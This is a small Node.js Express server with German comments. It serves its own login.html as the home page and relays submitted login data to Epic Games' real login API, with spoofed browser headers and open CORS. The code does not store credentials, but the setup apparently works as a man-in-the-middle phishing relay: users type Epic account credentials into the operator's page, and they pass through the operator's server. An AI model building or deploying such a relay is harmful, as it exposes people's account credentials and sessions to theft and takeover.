const express = require('express');
const fetch = require('node-fetch');

const app = express();

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

// Statische Dateien
app.use(express.static('public'));

// STARTSEITE = login.html
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/login.html');
});

// WICHTIG: Auch /login.html muss funktionieren!
app.get('/login.html', (req, res) => {
  res.sendFile(__dirname + '/public/login.html');
});

// API Login
app.post('/api/login', async (req, res) => {
  try {
    const response = await fetch('https://www.epicgames.com/id/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: JSON.stringify(req.body)
    });

    const data = await response.json();
    res.status(response.status).json(data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server läuft auf Port ' + PORT));
